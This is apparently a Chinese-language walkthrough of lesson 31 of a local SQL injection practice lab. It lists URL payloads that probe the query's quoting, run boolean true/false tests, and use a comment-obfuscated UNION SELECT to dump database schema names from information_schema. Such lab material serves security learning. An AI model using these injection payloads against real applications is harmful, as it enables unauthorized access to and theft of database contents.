# Lesson-31
```
Bool盲注-,-明注
```

```
http://127.0.0.1/Less-31/?id=1%22
通过上述语句的回显信息可以推断出 : ("$id")
剩下的思路和上题相同 , 不再赘述
```
```
http://127.0.0.1/Less-31/?id=0%22)||1--+
http://127.0.0.1/Less-31/?id=0%22)||0--+
```
```
http://127.0.0.1/Less-31/?id=0%22)union/**/select/**/1,group_concat(schema_name),1/**/from/**/information_schema.schemata--+
```
